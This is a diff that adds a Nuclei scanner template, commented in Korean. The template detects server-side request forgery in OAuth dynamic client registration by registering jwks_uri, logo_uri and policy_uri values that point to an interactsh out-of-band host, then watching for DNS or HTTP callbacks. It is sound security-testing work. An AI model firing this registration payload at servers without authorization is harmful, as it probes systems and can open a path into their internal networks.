@@ -1,0 +1,43 @@
+id: oauth-dcr-ssrf
+
+info:
+  name: 동적 클라이언트 등록 URL로 SSRF
+  author: sample-mcp-rs
+  severity: high
+  description: |
+    동적 클라이언트 등록(RFC 7591)에 넣은 jwks_uri, logo_uri, policy_uri를 인가 서버가 직접 가져가는지 본다.
+    서버가 그 URL로 요청하면 내부망 주소를 넣어 SSRF로 쓸 수 있다.
+    interactsh(OOB 서버)로 들어온 DNS 조회나 HTTP 요청으로 판단한다.
+  reference:
+    - https://datatracker.ietf.org/doc/html/rfc7591
+    - https://docs.projectdiscovery.io/templates/reference/oob-testing
+  tags: oauth,dcr,ssrf,oast,custom
+
+http:
+  - method: GET
+    path:
+      - "{{RootURL}}/.well-known/openid-configuration"
+
+    extractors:
+      - type: regex
+        name: reg_path
+        internal: true
+        group: 1
+        regex:
+          - '"registration_endpoint"\s*:\s*"https?://[^/"]+(/[^"]*)"'
+
+  - method: POST
+    path:
+      - "{{RootURL}}{{reg_path}}"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"client_name":"nuclei-dcr-ssrf","redirect_uris":["http://127.0.0.1/callback"],"token_endpoint_auth_method":"private_key_jwt","jwks_uri":"http://{{interactsh-url}}/jwks","logo_uri":"http://{{interactsh-url}}/logo","policy_uri":"http://{{interactsh-url}}/policy"}
+
+    # 서버가 URL의 호스트를 조회(dns)하거나 요청(http)하면 서버가 직접 가져간 것이다.
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - http
+          - dns
